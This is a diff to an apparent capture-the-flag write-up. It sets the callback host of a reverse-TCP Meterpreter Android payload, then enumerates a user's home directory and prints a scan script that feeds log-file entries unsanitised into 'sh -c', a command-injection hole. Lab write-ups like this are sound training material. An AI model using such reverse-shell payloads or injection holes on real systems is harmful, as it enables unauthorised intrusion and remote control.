@@ -343,7 +343,7 @@ We go back to `http://10.129.72.251:5000/` and upload this `.apk` file.
 payloads
 venom it up - gen rev tcp meterpreter bins
 os: android
-lhost: 10.10.x.x
+lhost: 1.2.3.4
 template file (optional): msf.apk
 ```
 Before we run it, we also start a listener.
@@ -380,3 +380,60 @@ cat user.txt
 ```
 
 ## 6. Privilege Escalation
+There are three users in this machine, `kid`, `pwn` and `root`. Since `pwn` is accessible, we enumerate it first.
+```
+pwd
+/home
+ls
+kid
+pwn
+cd pwn
+ls
+recon
+scanlosers.sh
+```
+There are two files in `pwn`!
+```
+ls -la
+total 44
+drwxr-xr-x 6 pwn  pwn  4096 Feb  3 12:06 .
+drwxr-xr-x 4 root root 4096 Feb  3 07:40 ..
+lrwxrwxrwx 1 root root    9 Feb  3 12:06 .bash_history -> /dev/null
+-rw-r--r-- 1 pwn  pwn   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 pwn  pwn  3771 Feb 25  2020 .bashrc
+drwx------ 2 pwn  pwn  4096 Jan 28 17:08 .cache
+drwxrwxr-x 3 pwn  pwn  4096 Jan 28 17:24 .local
+-rw-r--r-- 1 pwn  pwn   807 Feb 25  2020 .profile
+-rw-rw-r-- 1 pwn  pwn    74 Jan 28 16:22 .selected_editor
+drwx------ 2 pwn  pwn  4096 Jan 28 16:32 .ssh
+drwxrw---- 2 pwn  pwn  4096 Feb  7 06:10 recon
+-rwxrwxr-- 1 pwn  pwn   250 Jan 28 17:57 scanlosers.sh
+```
+Let's see what these files are about.
+```
+./scanlosers.sh
+/bin/sh: 16: ./scanlosers.sh: Permission denied
+
+cat scanlosers.sh
+#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+done
+
+if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+```
+Interesting, let's change directory to `/home/kid/logs` and see what we get.
+```
+pwd
+/home/kid/logs
+ls -la
+total 8
+drwxrwxrwx  2 kid kid 4096 Feb  3 07:40 .
+drwxr-xr-x 11 kid kid 4096 Feb  7 09:41 ..
+-rw-rw-r--  1 kid pwn    0 Feb  7 05:54 hackers
+```
+This `hackers` file's group owner is `pwn`! 
